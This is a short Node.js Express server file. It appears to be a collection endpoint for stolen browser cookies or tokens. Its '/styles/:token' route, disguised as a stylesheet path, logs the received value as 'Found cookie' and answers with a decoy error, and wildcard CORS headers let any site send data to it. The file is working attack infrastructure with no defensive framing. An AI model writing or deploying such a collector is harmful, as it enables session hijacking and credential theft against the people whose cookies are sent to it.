const express = require('express')
const chalk = require('chalk')
const port = 5000
const app = express()
const cors = require('cors')

let current_datetime = new Date();
  let formatted_date =
    current_datetime.getFullYear() +
    "-" +
    (current_datetime.getMonth() + 1) +
    "-" +
    current_datetime.getDate() +
    " " +
    current_datetime.getHours() +
    ":" +
    current_datetime.getMinutes() +
    ":" +
    current_datetime.getSeconds();

const Logger = (req, res, next) => {
    console.log(`[${chalk.blue('LOGGER')}] [${chalk.green(req.method)}] TO ${chalk.red(req.path)} AT ${chalk.magenta(formatted_date)}`)
    next();
}

app.all('/*', function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "X-Requested-With");
    next();
  });

app.use(Logger)

app.listen(port, () => {
    console.log(`[${chalk.green('SERVER')}] Running on port ${port}`)
})

app.get('/styles/:token', (req, res, next) => {
    let token = req.params
    console.log(`[${chalk.green('TOKEN')}] Found cookie ${chalk.red(token.token)}`)
    res.json({ error: true, message: 'Invalid Request', code: 500 })
})
